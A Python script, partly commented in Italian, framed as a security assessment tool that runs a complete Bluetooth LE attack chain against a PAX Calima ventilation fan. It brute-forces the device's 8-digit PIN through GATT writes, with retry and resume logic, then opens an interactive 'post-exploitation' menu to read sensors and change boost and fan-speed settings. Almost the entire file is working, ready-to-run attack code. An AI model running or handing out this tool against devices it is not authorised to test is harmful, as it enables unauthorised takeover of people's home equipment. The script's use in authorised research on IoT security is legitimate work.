#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║        PAX CALIMA — FULL ATTACK CHAIN (Security Assessment)          ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  Fase 1: Brute-force attack on the BLE PIN (uint32 LE, 8 digits)     ║
║  Fase 2: Full control of the device (post-exploitation)              ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import struct
import math
import time
from bleak import BleakClient, BleakScanner, BleakError

# ═══════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════

TARGET = "XX:XX:XX:XX:XX:XX"  # ← Replace with your PAX Calima BLE MAC address

# UUID Caratteristiche BLE (da reverse engineering pycalima)
CHAR_PIN_CODE = "4cad343a-209a-40b7-b911-4d9b3df569b2"
CHAR_PIN_CONFIRMATION = "d1ae6b70-ee12-4f6d-b166-d2063dcaffe1"
CHAR_SENSOR_DATA = "528b80e8-c47a-4c0a-bdf1-916a7748f412"
CHAR_FAN_SPEED = "faa49e09-a79c-4725-b197-bdc57c67dc32"
CHAR_BOOST = "1488a757-35bc-4ec8-9a6b-9ecf1502778e"
CHAR_SENSITIVITY = "e782e131-6ce1-4191-a8db-f4304d7610f1"
CHAR_MODE = "b5836b55-57bd-433e-8480-46e4993c5ac0"
CHAR_MANUFACTURER = "00002a29-0000-1000-8000-00805f9b34fb"
CHAR_MODEL_NUMBER = "00002a24-0000-1000-8000-00805f9b34fb"
CHAR_FIRMWARE_REV = "00002a26-0000-1000-8000-00805f9b34fb"
CHAR_HARDWARE_REV = "00002a27-0000-1000-8000-00805f9b34fb"
CHAR_SOFTWARE_REV = "00002a28-0000-1000-8000-00805f9b34fb"

# Parametri brute-force
PIN_MIN = 0
PIN_MAX = 99999999
PROGRESS_INTERVAL = 100
CONNECTION_TIMEOUT = 30.0
ATTEMPT_DELAY = 0.05
RECONNECT_DELAY = 2.0
MAX_RECONNECT_ATTEMPTS = 10


# ═══════════════════════════════════════════════════════════════════════
# FASE 1: BRUTE-FORCE
# ═══════════════════════════════════════════════════════════════════════

async def try_pin(client, pin_int):
    """
    Prova un singolo PIN sul dispositivo.
    Invia il PIN come uint32 little-endian e legge la conferma.
    
    Returns:
        True se il PIN è corretto (confirmation != 0), False altrimenti.
    """
    pin_bytes = struct.pack("<I", pin_int)
    await client.write_gatt_char(CHAR_PIN_CODE, pin_bytes)
    confirmation = await client.read_gatt_char(CHAR_PIN_CONFIRMATION)
    return any(b != 0 for b in confirmation)


async def connect_with_retry(max_attempts=MAX_RECONNECT_ATTEMPTS):
    """
    Connessione al dispositivo BLE con meccanismo di retry.
    Gestisce disconnessioni tipiche dei dispositivi BLE a basso costo.
    """
    for attempt in range(1, max_attempts + 1):
        try:
            print(f"  🔗 Connection attempt {attempt}/{max_attempts}...")
            client = BleakClient(TARGET, timeout=CONNECTION_TIMEOUT)
            await client.connect()
            if client.is_connected:
                print(f"  ✅ Connected!")
                return client
        except (BleakError, asyncio.TimeoutError, OSError) as e:
            print(f"  ⚠ Connection failed: {e}")
            if attempt < max_attempts:
                print(f" Waiting {RECONNECT_DELAY} seconds before retrying...")
                await asyncio.sleep(RECONNECT_DELAY)
    return None


def format_time(seconds):
    """Formatta secondi in formato leggibile (s/min/ore/giorni)."""
    if seconds < 60:
        return f"{seconds:.1f}s"
    elif seconds < 3600:
        return f"{seconds/60:.1f} min"
    elif seconds < 86400:
        return f"{seconds/3600:.1f} ore"
    else:
        return f"{seconds/86400:.1f} giorni"


def format_pin(pin_int):
    """Formatta il PIN come stringa a 8 cifre con zero-padding."""
    return f"{pin_int:08d}"


async def brute_force(start_offset=0):
    """
    Fase 1: Brute-force del PIN.
    Prova sequenzialmente tutti i PIN da start_offset a 99999999.
    
    Returns:
        Il PIN trovato (int) oppure None se non trovato.
    """
    print("\n" + "═" * 62)
    print("║  PHASE 1: BRUTE-FORCE PIN                                    ║")
    print("═" * 62)
    print(f"  Target:  {TARGET}")
    print(f"  Range:   {format_pin(start_offset)} → {format_pin(PIN_MAX)}")
    print(f"  PIN to try: {PIN_MAX - start_offset + 1:,}")
    print("═" * 62)

    # Connessione iniziale
    print("\n Connecting to the device...")
    client = await connect_with_retry()
    if not client:
        print("Unable to connect. Logging out.")
        return None

    # Statistiche
    total_attempts = 0
    start_time = time.time()
    pin_found = None
    current_pin = start_offset

    print(f"\n🔓 Start a brute-force attack from PIN {format_pin(start_offset)}...")
    print(f"   Progress every {PROGRESS_INTERVAL} attempts\n")

    try:
        while current_pin <= PIN_MAX:
            # Verifica connessione
            if not client.is_connected:
                print(f"\n  Logged out! Last PIN: {format_pin(current_pin - 1)}")
                print(f"  Reconnection...")
                await asyncio.sleep(RECONNECT_DELAY)
                client = await connect_with_retry()
                if not client:
                    print(f"\nReconnection failed. Resume from offset {current_pin}")
                    break
                print(f" Resuming from PIN {format_pin(current_pin)}\n")

            # Tentativo PIN
            try:
                success = await try_pin(client, current_pin)
                total_attempts += 1

                if success:
                    elapsed = time.time() - start_time
                    pin_found = current_pin
                    #print("\n" + "🎉" * 20)
                    print(f"\n  ✅ PIN FOUND: {format_pin(pin_found)}")
                    print(f"  Time: {format_time(elapsed)}")
                    print(f"  Attempts: {total_attempts:,}")
                    print(f"  Speed: {total_attempts/elapsed:.1f} trials/s")
                    print("\n" + "🎉" * 20)
                    break

                # Stampa progresso
                if total_attempts % PROGRESS_INTERVAL == 0:
                    elapsed = time.time() - start_time
                    rate = total_attempts / elapsed if elapsed > 0 else 0
                    remaining = PIN_MAX - current_pin
                    eta = remaining / rate if rate > 0 else float('inf')
                    pct = ((current_pin - start_offset) / (PIN_MAX - start_offset + 1)) * 100
                    print(f"  [{pct:6.3f}%] PIN: {format_pin(current_pin)} | "
                          f"Attempts: {total_attempts:,} | "
                          f"Speed: {rate:.1f}/s | ETA: {format_time(eta)}")

                current_pin += 1
                if ATTEMPT_DELAY > 0:
                    await asyncio.sleep(ATTEMPT_DELAY)

            except (BleakError, asyncio.TimeoutError, OSError) as e:
                print(f"\n  BLE error PIN {format_pin(current_pin)}: {e}")
                try:
                    await client.disconnect()
                except Exception:
                    pass
                client = BleakClient(TARGET, timeout=CONNECTION_TIMEOUT)
                continue

    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        print(f"\n\n Interrupted! Last PIN:: {format_pin(current_pin)}")
        print(f"  To resume, use the offset: {current_pin}")
        print(f"  Attempts: {total_attempts:,} | Tempo: {format_time(elapsed)}")

    finally:
        try:
            if client and client.is_connected:
                await client.disconnect()
                print("  Disconnected.")
        except Exception:
            pass

    # Riepilogo
    elapsed = time.time() - start_time
    print("\n" + "─" * 62)
    print("  BRUTE-FORCE SUMMARY")
    print("─" * 62)
    print(f"  PIN found:      {'YES → ' + format_pin(pin_found) if pin_found is not None else 'NO'}")
    print(f"  Total attempts: {total_attempts:,}")
    print(f"  Total time:     {format_time(elapsed)}")
    if total_attempts > 0 and elapsed > 0:
        rate = total_attempts / elapsed
        print(f"  Average speed:   {rate:.1f} tentativi/s")
        print(f"  Estimated time for a full brute-force attack: {format_time((PIN_MAX + 1) / rate)}")
    print("─" * 62)

    return pin_found


# ═══════════════════════════════════════════════════════════════════════
# FASE 2: POST-EXPLOITATION (CONTROLLO REMOTO)
# ═══════════════════════════════════════════════════════════════════════

def parse_sensor_data(data):
    """
    Decodifica i 12 byte dei sensori PAX Calima.
    Formato struct: '<4HBHB'
      - Humidity (raw) → log2(val) * 10 = percentuale
      - Temperature (raw) → val / 4 = °C
      - Light (lux)
      - Fan speed (RPM)
      - Mode byte (trigger attivo)
      - Extra short
      - Extra byte
    """
    if len(data) < 12:
        print(f"  Sensor data too short: {len(data)} bytes")
        return None

    values = struct.unpack('<4HBHB', data)
    humidity_raw = values[0]
    temp_raw = values[1]
    light = values[2]
    fan_speed = values[3]
    mode_byte = values[4]
    extra_short = values[5]
    extra_byte = values[6]

    humidity = round(math.log2(humidity_raw) * 10, 1) if humidity_raw > 0 else 0.0
    temperature = temp_raw / 4.0

    mode_names = {
        0x00: "Spento / Inattivo",
        0x01: "Umidità",
        0x02: "Luce",
        0x03: "Boost (manuale)",
        0x04: "Timer",
        0xcb: "Attivo (combinato)",
    }
    mode_str = mode_names.get(mode_byte, f"Sconosciuto (0x{mode_byte:02x})")

    return {
        "humidity_raw": humidity_raw, "humidity": humidity,
        "temp_raw": temp_raw, "temperature": temperature,
        "light": light, "fan_speed": fan_speed,
        "mode_byte": mode_byte, "mode_str": mode_str,
        "extra_short": extra_short, "extra_byte": extra_byte,
    }


def print_sensor_info(parsed):
    """Stampa formattata stato sensori."""
    print("\n╔══════════════════════════════════════╗")
    print("║       STATUS OF CALIMA PAX SENSORS     ║")
    print("╠══════════════════════════════════════╣")
    print(f"║  Temperature: {parsed['temperature']:.1f}°C")
    print(f"║  Humidity:     {parsed['humidity']:.1f}%")
    print(f"║  Light:        {parsed['light']} lux")
    print(f"║  Fan:     {parsed['fan_speed']} RPM")
    print(f"║  Mode:        {parsed['mode_str']}")
    print("╚══════════════════════════════════════╝")


async def read_sensor_status(client):
    """Legge e visualizza dati sensori."""
    data = await client.read_gatt_char(CHAR_SENSOR_DATA)
    print(f"\n  Raw ({len(data)} bytes): {data.hex()}")
    parsed = parse_sensor_data(data)
    if parsed:
        print_sensor_info(parsed)
    return parsed


async def read_fan_speed_settings(client):
    """Legge velocità ventola."""
    try:
        data = await client.read_gatt_char(CHAR_FAN_SPEED)
        print(f"\n  Fan speed data ({len(data)} bytes): {data.hex()}")
        if len(data) >= 2:
            print(f"  Speed: {struct.unpack_from('<H', data, 0)[0]} RPM")
        return data
    except Exception as e:
        print(f"  Error: {e}")
        return None


async def activate_boost(client):
    """Attiva boost mode con velocità e durata personalizzate."""
    print("\n--- BOOST ACTIVATION ---")
    try:
        speed = int(input("  Speed (RPM, es. 2400): ") or "2400")
        seconds = int(input("  Duration (seconds, es. 300): ") or "300")
    except ValueError:
        speed, seconds = 2400, 300

    payload = struct.pack("<BHH", 1, speed, seconds)
    print(f"  Payload: {payload.hex()}")
    try:
        await client.write_gatt_char(CHAR_BOOST, payload)
        print(f"  Boost activated: {speed} RPM per {seconds}s")
    except Exception as e:
        print(f"  Error: {e}")


async def deactivate_boost(client):
    """Disattiva boost mode."""
    payload = struct.pack("<BHH", 0, 0, 0)
    try:
        await client.write_gatt_char(CHAR_BOOST, payload)
        print(" Boost deactivate")
    except Exception as e:
        print(f"  ❌ Error: {e}")


async def set_fan_speed_levels(client):
    """Imposta soglie di velocità per umidità."""
    print("\n--- SPEED SETTING ---")
    try:
        threshold = int(input("  Humidity threshold (%): ") or "75")
        high = int(input("  HIGH speed (RPM): ") or "2400")
        medium = int(input("  AVERAGE speed (RPM): ") or "1600")
        low = int(input("  LOW speed (RPM): ") or "800")
    except ValueError:
        print("  Invalid values")
        return

    payload = struct.pack("<4H", threshold, high, medium, low)
    try:
        await client.write_gatt_char(CHAR_SENSITIVITY, payload)
        print("  Set speeds")
    except Exception as e:
        print(f"  Error: {e}")


async def read_sensitivity(client):
    """Legge impostazioni sensibilità."""
    try:
        data = await client.read_gatt_char(CHAR_SENSITIVITY)
        if len(data) >= 8:
            v = struct.unpack('<4H', data[:8])
            print(f"\n  Humidity threshold: {v[0]}%")
            print(f"  High: {v[1]} RPM | Average: {v[2]} RPM | Low: {v[3]} RPM")
        return data
    except Exception as e:
        print(f"  Error: {e}")
        return None


async def read_mode(client):
    """Legge modalità operativa."""
    try:
        data = await client.read_gatt_char(CHAR_MODE)
        print(f"\n  Mode ({len(data)} bytes): {data.hex()}")
        return data
    except Exception as e:
        print(f"  Error: {e}")
        return None


async def read_device_info(client):
    """Legge info dispositivo dal servizio 0x180A."""
    print("\n╔══════════════════════════════════════╗")
    print("║      DEVICE INFORMATION              ║")
    print("╠══════════════════════════════════════╣")
    for uuid, name in [
        (CHAR_MANUFACTURER, "Vendor"),
        (CHAR_MODEL_NUMBER, "Model"),
        (CHAR_FIRMWARE_REV, "Firmware"),
        (CHAR_HARDWARE_REV, "Hardware"),
        (CHAR_SOFTWARE_REV, "Software"),
    ]:
        try:
            data = await client.read_gatt_char(uuid)
            try:
                value = data.decode('utf-8').strip('\x00')
            except UnicodeDecodeError:
                value = data.hex()
            print(f"║  {name:12s}: {value}")
        except Exception:
            print(f"║  {name:12s}: (N/A)")
    print("╚══════════════════════════════════════╝")


async def read_boost_status(client):
    """Legge stato boost attuale."""
    try:
        data = await client.read_gatt_char(CHAR_BOOST)
        if len(data) >= 5:
            v = struct.unpack('<BHH', data[:5])
            print(f"\n  Boost: {'ATTIVO' if v[0] else 'SPENTO'}")
            print(f"  Speed: {v[1]} RPM | Remaining time: {v[2]}s")
        return data
    except Exception as e:
        print(f"  Error: {e}")
        return None


def print_menu():
    """Menu interattivo post-exploitation."""
    print("\n┌─────────────────────────────────────┐")
    print("│    CALIMA CONTROL MENU               │")
    print("├──────────────────────────────────────┤")
    print("│  1) Read sensor status               │")
    print("│  2) Activate boost                   │")
    print("│  3) Turn off boost                   │")
    print("│  4) Set speed levels                 │")
    #print("│  5) Read sensitivity settings        │")
    print("│  5) Read boost status                │")
    #print("│  7) Read the operating procedures    │")
    print("│  6) Info device                      │")
    #print("│  7) Fan speed readings               │")
    print("│  0) Log out and exit                 │")
    print("└──────────────────────────────────────┘")


async def post_exploitation(pin_code):
    """
    Fase 2: Connessione autenticata e controllo interattivo.
    Usa il PIN scoperto in Fase 1 per autenticarsi e controllare il dispositivo.
    """
    print("\n" + "═" * 62)
    print("║  PHASE 2: POST-EXPLOITATION (REMOTE CONTROL)                ║")
    print("═" * 62)
    print(f"  Target: {TARGET}")
    print(f"  PIN:    {format_pin(pin_code)}")
    print("═" * 62)

    print("\n Connection for post-exploitation...")

    async with BleakClient(TARGET, timeout=CONNECTION_TIMEOUT) as client:
        print("  Connected!")
        print(f"  Services: {len(client.services.services)}")

        # Autenticazione con PIN trovato
        print("\n--- AUTHENTICATION ---")
        pin_bytes = struct.pack("<I", pin_code)
        print(f"  Send PIN: {format_pin(pin_code)} → {pin_bytes.hex()}")
        await client.write_gatt_char(CHAR_PIN_CODE, pin_bytes)

        confirmation = await client.read_gatt_char(CHAR_PIN_CONFIRMATION)
        if any(b != 0 for b in confirmation):
            print("  Authentication SUCCESSFUL — full access granted!")
        else:
            print("  Authentication failed.")
            return

        # Menu interattivo
        while True:
            print_menu()
            try:
                choice = input("\n  Choice: ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n\n  Interrupted.")
                break

            if choice == "1":
                await read_sensor_status(client)
            elif choice == "2":
                await activate_boost(client)
            elif choice == "3":
                await deactivate_boost(client)
            elif choice == "4":
                await set_fan_speed_levels(client)
            #elif choice == "5":
                #await read_sensitivity(client)
            elif choice == "5":
                await read_boost_status(client)
            #elif choice == "7":
                #await read_mode(client)
            elif choice == "6":
                await read_device_info(client)
            #elif choice == "7":
                #await read_fan_speed_settings(client)
            elif choice == "0":
                print("\n  Log out...")
                break
            else:
                print("  Invalid choice.")

    print("\n Offline. Assessment completed.")


# ═══════════════════════════════════════════════════════════════════════
# MAIN — ORCHESTRAZIONE ATTACK CHAIN
# ═══════════════════════════════════════════════════════════════════════

async def main():
    """
    Entry point principale.
    Orchestrazione completa: Brute-Force → Post-Exploitation.
    """
    print("\n╔══════════════════════════════════════════════════════════════╗")
    print("║     PAX CALIMA — FULL BLE ATTACK CHAIN                      ║")
    print("║     Security Assessment Tool                                 ║")
    print("╠══════════════════════════════════════════════════════════════╣")
    print("║  Attack:  PIN Brute-Force → Authenticated Control           ║")
    print("║  Method:  BLE GATT Write (uint32 LE) + Read Confirmation    ║")
    print("╚══════════════════════════════════════════════════════════════╝")

    print("\n  Select mode:")
    print("  [1] Full attack chain (brute-force + remote control)")
    print("  [2] Only brute-force")
    print("  [3] Only remote control (known PIN)")

    try:
        mode = input("\n  Mode [1]: ").strip() or "1"
    except (EOFError, KeyboardInterrupt):
        print("\n  Exit.")
        return

    if mode == "1":
        # FULL CHAIN: brute-force poi controllo
        try:
            offset_input = input("  Initial offset brute-force [0]: ").strip() or "0"
            start_offset = int(offset_input)
        except (ValueError, EOFError, KeyboardInterrupt):
            start_offset = 0

        pin_found = await brute_force(start_offset)

        if pin_found is not None:
            print(f"\n\n🎯 PIN cracked: {format_pin(pin_found)}")
            try:
                proceed = input("  Proceed with post-exploitation? [Y/n]: ").strip().lower()
            except (EOFError, KeyboardInterrupt):
                proceed = "n"

            if proceed != "n":
                await post_exploitation(pin_found)
        else:
            print("\n  PIN not found. Attack chain interrupted.")

    elif mode == "2":
        # SOLO BRUTE-FORCE
        try:
            offset_input = input(" Initial Offset [0]: ").strip() or "0"
            start_offset = int(offset_input)
        except (ValueError, EOFError, KeyboardInterrupt):
            start_offset = 0

        await brute_force(start_offset)

    elif mode == "3":
        # SOLO CONTROLLO CON PIN NOTO
        try:
            pin_input = input("  Enter your PIN (8 digits): ").strip()
            pin_code = int(pin_input)
        except (ValueError, EOFError, KeyboardInterrupt):
            print("  Invalid PIN.")
            return

        await post_exploitation(pin_code)

    else:
        print("  Invalid mode.")


if __name__ == "__main__":
    asyncio.run(main())
